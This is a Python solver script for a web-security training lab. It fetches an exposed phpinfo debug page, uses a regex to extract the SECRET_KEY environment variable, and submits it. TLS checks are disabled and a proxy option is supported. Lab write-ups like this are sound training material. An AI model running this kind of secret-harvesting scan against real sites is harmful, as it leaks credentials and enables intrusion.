"""
    Lab: Information disclosure on debug page

    This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable.

    Exploit Steps:
    1. GET /cgi-bin/phpinfo.php
    2. Parser SECRET_KEY from the response  <td class="e">SECRET_KEY </td><td class="v">9xzn5pk47ry57b8r9frqxmoi0x6tpsd8 </td>
    3. Submit the extracted SECRET_KEY using the button provided in the lab banner.
    
    Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0:1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Starting information disclosure attack...{Fore.RESET}")

    message = get_debug_page(session)
    if message:
        secret_key = get_secret_key(message)
        if secret_key:
            print(f"{Fore.GREEN}[+] Found SECRET_KEY: {secret_key}{Fore.RESET}")
            submit_solution(session, secret_key)
        else:
            print(f"{Fore.RED}[-] Could not parse SECRET_KEY from debug page{Fore.RESET}")

def get_debug_page(session):
    print(f"{Fore.YELLOW}[*] Accessing debug page...{Fore.RESET}")
    r = session.get(f"{URL}/cgi-bin/phpinfo.php")
    if r.status_code == 200:
        return r.text
    return None

def get_secret_key(message):
    match = re.search(r'<td class="e">SECRET_KEY </td><td class="v">([^<]+) </td>', message)
    if match:
        return match.group(1)
    return None

def submit_solution(session, secret):
    print(f"{Fore.YELLOW}[*] Submitting solution...{Fore.RESET}")
    r = session.get(f"{URL}/?solution={secret}")
    if "Congratulations, you solved the lab!" in r.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")

if __name__ == "__main__":
    main()